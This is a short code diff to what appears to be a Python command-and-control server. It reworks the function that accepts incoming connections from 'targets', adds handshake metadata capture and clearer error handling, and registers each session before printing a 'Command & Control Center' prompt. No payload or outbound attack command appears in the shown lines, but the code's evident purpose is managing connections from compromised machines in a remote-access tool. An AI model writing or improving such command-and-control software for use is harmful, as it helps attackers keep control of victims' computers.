@@ -288,12 +288,28 @@ def accept_connections(sock):
         sock.settimeout(1)
         try:
             target, ip = sock.accept()
+            print(Colour().green(f"[+] Connection received from {ip}"))
+
+            # Attempt to receive handshake metadata
+            try:
+                handshake = reliable_recv(target)
+                print(Colour().blue(f"[+] Handshake data: {handshake}"))
+            except Exception as e:
+                print(Colour().red(f"[!] Failed to receive handshake from {ip}: {e}"))
+                handshake = {"platform": "unknown"}
+
+            # Register the target
             targets.append(target)
             ips.append(ip)
-            print(Colour().green(str(ip) + ' has connected!') +
-                  '\n[**] Command & Control Center: ', end="")
-        except:
-            pass
+            print(Colour().green(f"[+] Session registered for {ip}"))
+            print('[**] Command & Control Center: ', end="")
+
+        except socket.timeout:
+            continue
+        except Exception as e:
+            print(Colour().red(f"[!] Error accepting connection: {e}"))
+            continue
+
 
 
 def close_all_target_connections(targets):
